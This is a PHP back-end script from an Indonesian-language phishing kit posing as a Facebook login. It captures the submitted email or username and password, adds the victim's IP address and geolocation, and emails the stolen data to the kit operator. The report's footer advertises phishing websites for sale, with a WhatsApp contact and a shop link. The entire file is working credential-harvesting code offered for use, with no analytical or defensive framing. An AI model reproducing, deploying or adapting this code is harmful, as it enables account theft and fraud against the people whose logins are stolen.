<?php
if(!$_POST){
    header("Location: ./");
}

$user = $_POST['email'];
$pass = $_POST['password'];

include "email.php";
include "zerohost/geolocation.php";

$subject = "$gcodeExec2[gcodeFlag] | $gcodeExec2[gcodeDial] | MODE SANGE💦 [ ".$user." ]";
$message = '
<center>
<img src="https://i.ibb.co/2qf0Rv7/7-E4530-E2-28-AA-4-FAE-A170-0-AD90-CBE83-EB.jpg" style="width: 100%; display: block; margin: auto;">
			
<div style="background: #ff00fb; width: 294; color: #fff; text-align: center; padding: 10px;">ðŸ”« Created by Zer Host ðŸ”«</div>
		
		
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Informasi Korban</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>IP Address</th>
<th style="width: 78%; text-align: center;"><b>'.$gcodeExec['query'].'</th> 
</tr>
</table>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Informasi Akun</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Email/No Telp/Username</th>
<th style="width: 78%; text-align: center;"><b>'.$user.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Password</th>
<th style="width: 78%; text-align: center;"><b>'.$pass.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Operator</th>
<th style="width: 78%; text-align: center;"><b>'.$gcodeExec3['operator'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Login</th>
<th style="width: 78%; text-align: center;"><b>FACEBOOK</th> 
</tr>
</table>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Informasi Tambahan</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Country</th>
<th style="width: 78%; text-align: center;"><b>'.$gcodeExec['country'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Region</th>
<th style="width: 78%; text-align: center;"><b>'.$gcodeExec['regionName'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>City</th>
<th style="width: 78%; text-align: center;"><b>'.$gcodeExec['city'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Latitude</th>
<th style="width: 78%; text-align: center;"><b>'.$gcodeExec['lat'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Longitude</th>
<th style="width: 78%; text-align: center;"><b>'.$gcodeExec['lon'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Waktu Masuk</th>
<th style="width: 78%; text-align: center;"><b>'.$gcodeExec2['gcodeTime'].'</th>
</tr>
</table>
<div style="background: #000; width: 294; color: #fff; text-align: center; padding: 10px;"><b>Mau Beli Web Phising ? <br>Whatsapp <a href="https://wa.me/6285624196173"><b>Klik Disini</b></a>

<br> Lihat Tampilan Web Di <a href="https://zerostore13.com/listweb"><b>Klik Disini</b></a> </div> 

							

<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">


	</div>
</div>
</center>
';
$headersx  = 'MIME-Version: 1.0' . "\r\n";
$headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headersx .=  ''.$sender.'' . "\r\n";
$gcodeSend = mail($emailku, $subject, $message, $headersx);